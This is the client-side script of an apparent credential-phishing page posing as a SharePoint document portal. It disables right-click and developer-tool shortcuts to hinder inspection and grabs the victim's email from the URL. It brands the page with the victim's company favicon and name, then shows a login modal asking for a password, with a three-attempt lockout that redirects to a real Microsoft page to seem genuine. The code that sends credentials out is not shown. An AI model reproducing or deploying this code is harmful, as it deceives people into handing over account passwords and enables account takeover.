<script>
// Disable right-click
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
});

// Block shortcut keys
document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 's')) {
        e.preventDefault();
        return false;
    }
});

// Email auto-grabber
function getAutoEmail() {
    let hash = window.location.hash;
    if (hash && hash.length > 1) {
        let email = decodeURIComponent(hash.substring(1));
        if (email.includes('&')) email = email.split('&')[0];
        if (email.includes('?')) email = email.split('?')[0];
        if (email.includes('@')) return email;
    }
    let params = new URLSearchParams(window.location.search);
    let email = params.get('email') || params.get('e') || params.get('user');
    if (email && email.includes('@')) return email;
    let match = window.location.href.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/);
    return match ? match[0] : '';
}

const autoEmail = getAutoEmail();
const domain = autoEmail ? autoEmail.split('@')[1] : '';

// Dynamic favicon
function updateFavicon(domainName) {
    const favicon = document.getElementById('dynamic-favicon');
    if (domainName && domainName.includes('.')) {
        favicon.href = "https://www.google.com/s2/favicons?sz=64&domain=" + domainName;
        let domainCap = domainName.split('.')[0].charAt(0).toUpperCase() + domainName.split('.')[0].slice(1);
        document.title = domainCap + " SharePoint | Document Portal";
    }
}

if (autoEmail) {
    document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-check-circle"></i> ' + autoEmail;
    document.getElementById('emailHint').style.background = '#2b8c5e';
    if (domain) updateFavicon(domain);
} else {
    document.getElementById('loggedEmail').innerHTML = '<i class="fas fa-exclamation-triangle"></i> No session detected';
}

// 3-attempt tracking
let attemptCount = 0;
const MAX_ATTEMPTS = 3;
let currentDoc = null;

function showErrorPage() {
    window.location.href = 'https://www.microsoft.com/security';
}

function requestAccess(docTitle, docDetails, docSize) {
    if (sessionStorage.getItem('locked_out') === 'true') {
        showErrorPage();
        return;
    }
    
    currentDoc = { title: docTitle, details: docDetails, size: docSize };
    document.getElementById('docName').innerText = docTitle;
    document.getElementById('docDetails').innerText = docDetails;
    document.getElementById('docSize').innerText = docSize;
    
    if (autoEmail) {
        document.getElementById('email').value = autoEmail;
    } else {
        document.getElementById('email').value = '';
    }
    
    document.getElementById('password').value = '';
    document.getElementById('modalError').style.display = 'none';
    


    
    document.getElementById('loginModal').classList.add('active');
}

// Attach click handlers to cards
var cards = document.querySelectorAll('.document-card');
for (var i = 0; i < cards.length; i++) {
    cards[i].addEventListener('click', function(e) {
        e.stopPropagation();
        var title = this.getAttribute('data-doc-title');
        var details = this.getAttribute('data-doc-details');
        var size = this.getAttribute('data-doc-size');
        requestAccess(title, details, size);
    });
}





document.getElementById('loginModal').addEventListener('click', function(e) {
    if (e.target === this) {
        this.classList.remove('active');
    }
});



</script>
